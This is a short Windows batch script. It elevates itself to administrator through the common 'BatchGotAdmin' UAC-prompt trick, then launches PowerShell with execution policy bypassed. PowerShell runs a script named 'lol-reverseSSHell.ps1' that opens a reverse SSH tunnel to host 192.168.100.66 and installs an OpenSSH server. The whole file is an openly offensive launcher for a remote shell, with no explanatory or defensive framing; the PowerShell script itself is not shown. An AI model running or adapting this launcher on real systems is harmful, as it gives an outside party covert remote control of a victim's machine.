@echo off 
 
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
IF '%PROCESSOR_ARCHITECTURE%' EQU 'amd64' (
   >nul 2>&1 "%SYSTEMROOT%\SysWOW64\icacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
   >nul 2>&1 "%SYSTEMROOT%\system32\icacls.exe" "%SYSTEMROOT%\system32\config\system"
)
 
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
 
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
    "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
     exit /B
 
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
 
START Powershell.exe -executionpolicy bypass -Command  "%~dp0lol-reverseSSHell.ps1 -DestinationUserName \"aj\" -DestinationHost \"192.168.100.66\" -DestinationPort \"22\" -DestinationBindLocalPort \"7777\" -InstallOpenSSHServer \"yes\" "
 
